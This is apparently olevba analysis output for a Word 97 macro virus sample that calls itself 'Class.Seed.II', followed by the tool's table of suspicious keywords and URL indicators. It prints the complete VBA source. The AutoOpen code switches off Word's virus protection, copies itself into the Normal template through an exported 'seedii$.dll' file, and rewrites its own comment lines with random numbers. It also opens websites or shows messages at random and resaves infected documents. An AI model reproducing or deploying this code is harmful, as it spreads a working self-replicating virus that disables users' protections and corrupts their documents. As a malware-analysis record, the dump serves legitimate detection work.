olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.s2-61415ddf981c936ee3230832911876ac9a6d2b74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.s2-61415ddf981c936ee3230832911876ac9a6d2b74 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'1042334139043460262976104233413904346026297610423341390434602629761042334139043460262976
Randomize
'15584098428951543983089155840984289515439830891558409842895154398308915584098428951543983089
x = 0: o = 0
'798038488927683968225798038488927683968225798038488927683968225798038488927683968225
On Error GoTo 93
'7845320902536628218225784532090253662821822578453209025366282182257845320902536628218225
Options.VirusProtection = False
'141944330025122235136141944330025122235136141944330025122235136141944330025122235136
Options.SaveNormalPrompt = False
'394224996012212573444394224996012212573444394224996012212573444394224996012212573444
Options.ConfirmConversions = False
'735152727697757557929735152727697757557929735152727697757557929735152727697757557929
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'297995892123404410225297995892123404410225297995892123404410225297995892123404410225
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'3062990019656567389921306299001965656738992130629900196565673899213062990019656567389921
If xf > 96 And fx > 0 Then GoTo 93
'8386931840426771504400838693184042677150440083869318404267715044008386931840426771504400
If xf < 96 Then
'51185439368430361489511854393684303614895118543936843036148951185439368430361489
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'15882616090044836792009158826160900448367920091588261609004483679200915882616090044836792009
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'983154838092420541601983154838092420541601983154838092420541601983154838092420541601
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & "seedii$.dll"
'140911645924771228441140911645924771228441140911645924771228441140911645924771228441
End If
'803443322535984572416803443322535984572416803443322535984572416803443322535984572416
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'5750835648122810176575083564812281017657508356481228101765750835648122810176
k = Int(Rnd(1) * 100) + 1
'97001102535637133284970011025356371332849700110253563713328497001102535637133284
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'471543156139914046225471543156139914046225471543156139914046225471543156139914046225
l = Int(Rnd(1) * 75) + 1
'523061632955382562225523061632955382562225523061632955382562225523061632955382562225
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'1653384505610318496400165338450561031849640016533845056103184964001653384505610318496400
m = Int(Rnd(1) * 50) + 1
'5727884890014735046544572788489001473504654457278848900147350465445727884890014735046544
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'9091370736111781365764909137073611178136576490913707361117813657649091370736111781365764
n = Int(Rnd(1) * 25) + 1
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
xs.codemodule.AddFromFile Application.StartupPath & "seedii$.dll"
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
With xs.codemodule
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    For p = 1 To 4
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .deletelines 1
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    Next p
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End With
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
If xf < 96 Then
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    With xs.codemodule
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline 1, "Sub AutoClose()"
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline 99, "Sub ToolsMacro()"
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    End With
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End If
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
With xs.codemodule
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    For p = 2 To 44 Step 2
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    x = Int(Rnd(414835) * 403989) + 8485
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    o = Int(Rnd(298368) * 235865) + 2988
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
Next p
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    For xp = 46 To 98 Step 2
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
Next xp
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End With
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
93:
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End Sub
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
Sub ViewVBCode()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+

